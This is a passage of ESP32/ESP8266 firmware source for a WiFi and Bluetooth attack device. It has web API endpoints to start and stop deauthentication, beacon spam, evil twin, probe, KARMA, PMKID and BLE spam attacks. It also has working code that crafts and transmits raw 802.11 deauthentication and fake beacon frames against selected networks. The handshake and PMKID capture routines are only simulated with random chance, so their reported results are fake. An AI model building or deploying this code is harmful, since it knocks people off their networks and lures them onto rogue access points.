    Serial.println("[ATTACK] Deauthentication attack started");
    logActivity("Deauthentication attack initiated");
    
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/deauth/stop", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    deauthActive = false;
    attacking = false;
    
    Serial.println("[ATTACK] Deauthentication attack stopped");
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/beacon/start", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    beaconSpamActive = true;
    attacking = true;
    
    Serial.println("[ATTACK] Beacon spam attack started");
    logActivity("Beacon spam attack initiated");
    
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/beacon/stop", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    beaconSpamActive = false;
    attacking = false;
    
    Serial.println("[ATTACK] Beacon spam attack stopped");
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/eviltwin/start", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    evilTwinActive = true;
    attacking = true;
    
    Serial.println("[ATTACK] Evil twin attack started");
    logActivity("Evil twin attack initiated");
    
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/eviltwin/stop", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    evilTwinActive = false;
    attacking = false;
    
    Serial.println("[ATTACK] Evil twin attack stopped");
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/probe/start", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    probeAttackActive = true;
    attacking = true;
    
    Serial.println("[ATTACK] Probe attack started");
    logActivity("Probe attack initiated");
    
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/probe/stop", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    probeAttackActive = false;
    attacking = false;
    
    Serial.println("[ATTACK] Probe attack stopped");
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/handshake/start", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    handshakeCaptureActive = true;
    
    Serial.println("[ATTACK] Handshake capture started");
    logActivity("Handshake capture initiated");
    
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/handshake/stop", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    handshakeCaptureActive = false;
    
    Serial.println("[ATTACK] Handshake capture stopped");
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/karma/start", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    karmaAttackActive = true;
    attacking = true;
    
    Serial.println("[ATTACK] KARMA attack started");
    logActivity("KARMA attack initiated");
    
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/karma/stop", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    karmaAttackActive = false;
    attacking = false;
    
    Serial.println("[ATTACK] KARMA attack stopped");
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/pmkid/start", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    pmkidAttackActive = true;
    attacking = true;
    
    Serial.println("[ATTACK] PMKID attack started");
    logActivity("PMKID attack initiated");
    
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/pmkid/stop", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    pmkidAttackActive = false;
    attacking = false;
    
    Serial.println("[ATTACK] PMKID attack stopped");
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/attack/stop/all", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    
    // Stop all attacks
    deauthActive = false;
    beaconSpamActive = false;
    probeAttackActive = false;
    evilTwinActive = false;
    handshakeCaptureActive = false;
    karmaAttackActive = false;
    pmkidAttackActive = false;
    bleSpamActive = false;
    attacking = false;
    
    Serial.println("[ATTACK] All attacks stopped");
    logActivity("All attacks terminated");
    
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  #ifdef PLATFORM_ESP32
  // BLE endpoints
  server.on("/api/ble/scan/start", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    
    bleDevices.clear();
    pBLEScan->start(5, false);
    
    Serial.println("[BLE] BLE scan started");
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/ble/devices", HTTP_GET, []() {
    String json = "{\"devices\":[";
    
    for (size_t i = 0; i < bleDevices.size(); i++) {
      if (i > 0) json += ",";
      json += "{";
      json += "\"name\":\"" + bleDevices[i].name + "\",";
      json += "\"address\":\"" + bleDevices[i].address + "\",";
      json += "\"rssi\":" + String(bleDevices[i].rssi) + ",";
      json += "\"manufacturer\":\"" + bleDevices[i].manufacturer + "\",";
      json += "\"services\":\"" + bleDevices[i].services + "\"";
      json += "}";
    }
    
    json += "]}";
    
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(200, "application/json", json);
  });
  
  server.on("/api/ble/spam/start", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    bleSpamActive = true;
    attacking = true;
    
    Serial.println("[BLE] BLE spam attack started");
    logActivity("BLE spam attack initiated");
    
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  server.on("/api/ble/spam/stop", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    bleSpamActive = false;
    attacking = false;
    
    Serial.println("[BLE] BLE spam attack stopped");
    server.send(200, "application/json", "{\"success\":true}");
  });
  #endif
  
  // Statistics endpoints
  server.on("/api/stats", HTTP_GET, []() {
    String json = "{";
    json += "\"deauth\":" + String(stats.deauthPackets) + ",";
    json += "\"beacon\":" + String(stats.beaconPackets) + ",";
    json += "\"probe\":" + String(stats.probePackets) + ",";
    json += "\"ble\":" + String(stats.blePackets) + ",";
    json += "\"handshakes\":" + String(stats.handshakes) + ",";
    json += "\"total\":" + String(stats.totalPackets);
    json += "}";
    
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(200, "application/json", json);
  });
  
  server.on("/api/stats/reset", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    
    memset(&stats, 0, sizeof(stats));
    stats.startTime = millis();
    
    Serial.println("[STATS] Statistics reset");
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  // System control endpoints
  server.on("/api/system/reboot", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(200, "application/json", "{\"success\":true}");
    
    Serial.println("[SYSTEM] Reboot requested");
    delay(1000);
    ESP.restart();
  });
  
  server.on("/api/system/factory-reset", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(200, "application/json", "{\"success\":true}");
    
    Serial.println("[SYSTEM] Factory reset requested");
    
    // Clear file system
    FILESYSTEM.format();
    
    delay(2000);
    ESP.restart();
  });
  
  // Settings endpoints
  server.on("/api/settings/save", HTTP_POST, []() {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    // Settings would be saved to file system here
    server.send(200, "application/json", "{\"success\":true}");
  });
  
  // Handle all other requests (captive portal)
  server.onNotFound(handleNotFound);
  
  // Start server
  server.begin(80);
  Serial.println("[WEB] Web server started on port 80");
}

void handleRoot() {
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send_P(200, "text/html", MAIN_page);
}

void handleNotFound() {
  if (captivePortalEnabled) {
    // Redirect to main page for captive portal
    server.sendHeader("Location", "http://192.168.4.1", true);
    server.send(302, "text/plain", "");
  } else {
    server.send(404, "text/plain", "404: Not Found");
  }
}

void startWiFiScan() {
  if (scanning) {
    Serial.println("[SCAN] Scan already in progress");
    return;
  }
  
  scanning = true;
  networks.clear();
  
  Serial.println("[SCAN] Starting WiFi network scan...");
  logActivity("WiFi network scan initiated");
  
  // Ensure we're in the right mode for scanning
  #ifdef PLATFORM_ESP32
  WiFi.mode(WIFI_AP_STA);
  #else
  WiFi.mode(WIFI_AP_STA);
  #endif
  
  delay(100);
  
  // Start asynchronous scan
  int result = WiFi.scanNetworks(true, true);
  if (result == WIFI_SCAN_FAILED) {
    Serial.println("[SCAN] Failed to start scan");
    scanning = false;
  } else {
    Serial.println("[SCAN] Scan started successfully");
  }
}

void stopWiFiScan() {
  scanning = false;
  WiFi.scanDelete();
  Serial.println("[SCAN] WiFi scan stopped");
  logActivity("WiFi scan terminated");
}

void performDeauthAttack() {
  static unsigned long lastDeauth = 0;
  static int targetIndex = 0;
  
  unsigned long interval = aggressiveMode ? 50 : 100;
  
  if (millis() - lastDeauth > interval) {
    lastDeauth = millis();
    
    // Find selected networks to attack
    std::vector<int> targets;
    for (int i = 0; i < networks.size(); i++) {
      if (networks[i].selected) {
        targets.push_back(i);
      }
    }
    
    if (targets.empty()) return;
    
    // Round-robin through targets
    int currentTarget = targets[targetIndex % targets.size()];
    WiFiNetwork& target = networks[currentTarget];
    
    // Send deauth frame
    sendDeauthFrame(target.bssid_bytes, target.channel);
    
    stats.deauthPackets++;
    stats.totalPackets++;
    
    targetIndex++;
  }
}

void performBeaconSpam() {
  static unsigned long lastBeacon = 0;
  static int ssidIndex = 0;
  
  if (millis() - lastBeacon > 200) {
    lastBeacon = millis();
    
    // Get fake SSID
    String fakeSSID = fake_ssids[ssidIndex % (sizeof(fake_ssids) / sizeof(fake_ssids[0]))];
    
    // Send beacon frame
    sendBeaconFrame(fakeSSID, random(1, 14));
    
    stats.beaconPackets++;
    stats.totalPackets++;
    
    ssidIndex++;
  }
}

void performProbeAttack() {
  static unsigned long lastProbe = 0;
  
  if (millis() - lastProbe > 300) {
    lastProbe = millis();
    
    // Create and send probe request
    uint8_t probe_frame[68];
    memcpy(probe_frame, beacon_frame_default, sizeof(probe_frame));
    
    // Modify for probe request
    probe_frame[0] = 0x40; // Probe request
    
    // Random source MAC
    for (int i = 10; i < 16; i++) {
      probe_frame[i] = random(0x00, 0xFF);
    }
    
    if (sendRawPacket(probe_frame, sizeof(probe_frame))) {
      stats.probePackets++;
      stats.totalPackets++;
    }
  }
}

void performEvilTwin() {
  static unsigned long lastTwin = 0;
  static int twinIndex = 0;
  
  if (millis() - lastTwin > 500) {
    lastTwin = millis();
    
    // Find selected networks for evil twin
    std::vector<int> targets;
    for (int i = 0; i < networks.size(); i++) {
      if (networks[i].selected) {
        targets.push_back(i);
      }
    }
    
    if (!targets.empty()) {
      int targetIdx = targets[twinIndex % targets.size()];
      WiFiNetwork& target = networks[targetIdx];
      
      String evilSSID = target.ssid + "_Free";
      sendBeaconFrame(evilSSID, target.channel);
      
      stats.beaconPackets++;
      stats.totalPackets++;
      
      twinIndex++;
    }
  }
}

void performHandshakeCapture() {
  static unsigned long lastCheck = 0;
  
  if (millis() - lastCheck > 5000) {
    lastCheck = millis();
    
    // Simulate handshake detection
    if (random(100) < 10) { // 10% chance
      stats.handshakes++;
      Serial.println("[HANDSHAKE] Handshake captured (simulated)");
      logActivity("WPA handshake captured");
    }
  }
}

void performKarmaAttack() {
  static unsigned long lastKarma = 0;
  static int karmaIndex = 0;
  
  if (millis() - lastKarma > 400) {
    lastKarma = millis();
    
    String karmaSSID = "FreeWiFi_" + String(karmaIndex % 50);
    sendBeaconFrame(karmaSSID, random(1, 14));
    
    stats.beaconPackets++;
    stats.totalPackets++;
    
    karmaIndex++;
  }
}

void performPMKIDAttack() {
  static unsigned long lastPMKID = 0;
  
  if (millis() - lastPMKID > 10000) {
    lastPMKID = millis();
    
    // Simulate PMKID capture
    if (random(100) < 5) { // 5% chance
      Serial.println("[PMKID] PMKID captured (simulated)");
      logActivity("PMKID captured from target");
    }
  }
}

#ifdef PLATFORM_ESP32
void performBLESpam() {
  static unsigned long lastBLESpam = 0;
  static int bleIndex = 0;
  
  if (millis() - lastBLESpam > 100) {
    lastBLESpam = millis();
    
    // Create fake BLE advertisement
    String deviceName = "FakeDevice_" + String(bleIndex % 200);
    
    pAdvertising->setName(deviceName);
    pAdvertising->addServiceUUID(BLEUUID(random(0x1000, 0xFFFF)));
    
    pAdvertising->start();
    delay(10);
    pAdvertising->stop();
    
    stats.blePackets++;
    stats.totalPackets++;
    
    bleIndex++;
  }
}
#endif

void sendDeauthFrame(uint8_t* target_bssid, uint8_t channel) {
  uint8_t deauth_frame[26];
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame));
  
  // Set channel
  #ifdef PLATFORM_ESP32
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  #else
  wifi_set_channel(channel);
  #endif
  
  // Set addresses
  memcpy(&deauth_frame[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6); // Broadcast destination
  memcpy(&deauth_frame[10], target_bssid, 6); // Source (AP)
  memcpy(&deauth_frame[16], target_bssid, 6); // BSSID
  
  // Random sequence number
  deauth_frame[22] = random(0x00, 0xFF);
  deauth_frame[23] = random(0x00, 0xFF);
  
  sendRawPacket(deauth_frame, sizeof(deauth_frame));
}

void sendBeaconFrame(String ssid, uint8_t channel) {
  uint8_t beacon_frame[109];
  memcpy(beacon_frame, beacon_frame_default, sizeof(beacon_frame));
  
  // Set channel
  #ifdef PLATFORM_ESP32
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  #else
  wifi_set_channel(channel);
  #endif
  
  // Random BSSID
  for (int i = 10; i < 16; i++) {
    beacon_frame[i] = random(0x00, 0xFF);
  }
  beacon_frame[10] = 0x02; // Locally administered
  memcpy(&beacon_frame[16], &beacon_frame[10], 6); // Copy to BSSID field
  
  // Set SSID
  int ssidLen = min(32, (int)ssid.length());
  beacon_frame[37] = ssidLen;
  for (int i = 0; i < ssidLen; i++) {
    beacon_frame[38 + i] = ssid[i];
  }
  
  // Set channel in beacon
  beacon_frame[59] = channel;
  
  sendRawPacket(beacon_frame, sizeof(beacon_frame));
}

bool sendRawPacket(uint8_t* packet, uint16_t length) {
  if (!packet || length == 0) return false;
  
  #ifdef PLATFORM_ESP32
  return esp_wifi_80211_tx(WIFI_IF_AP, packet, length, false) == ESP_OK;
  #else
  return wifi_send_pkt_freedom(packet, length, 0) == 0;
  #endif
}

void updateLEDStatus() {
  static unsigned long lastLEDUpdate = 0;
  static bool ledState = false;
  
  unsigned long interval = 1000; // Default slow blink
  
  if (attacking) {
    interval = 100; // Fast blink for attacks
  } else if (scanning) {
    interval = 250; // Medium blink for scanning
  } else if (systemReady) {
    interval = 2000; // Very slow blink when idle
  }
  
  if (millis() - lastLEDUpdate > interval) {
    lastLEDUpdate = millis();
    ledState = !ledState;
    digitalWrite(LED_PIN, ledState ? LOW : HIGH);
  }
}

void logActivity(String activity) {
  unsigned long timestamp = millis() / 1000;
  Serial.printf("[%lus] %s\n", timestamp, activity.c_str());
}

void parseMAC(String macStr, uint8_t* macBytes) {
  // Handle both "XX:XX:XX:XX:XX:XX" and "XXXXXXXXXXXX" formats
  if (macStr.length() == 17) { // Format: XX:XX:XX:XX:XX:XX
    for (int i = 0; i < 6; i++) {
      String hexByte = macStr.substring(i * 3, i * 3 + 2);
      macBytes[i] = (uint8_t)strtol(hexByte.c_str(), NULL, 16);
    }
  } else if (macStr.length() == 12) { // Format: XXXXXXXXXXXX
    for (int i = 0; i < 6; i++) {
      String hexByte = macStr.substring(i * 2, i * 2 + 2);
      macBytes[i] = (uint8_t)strtol(hexByte.c_str(), NULL, 16);
    }
  } else {
    // Invalid format, zero out
    for (int i = 0; i < 6; i++) {
      macBytes[i] = 0;
    }
  }
}

String macToString(uint8_t* mac) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}
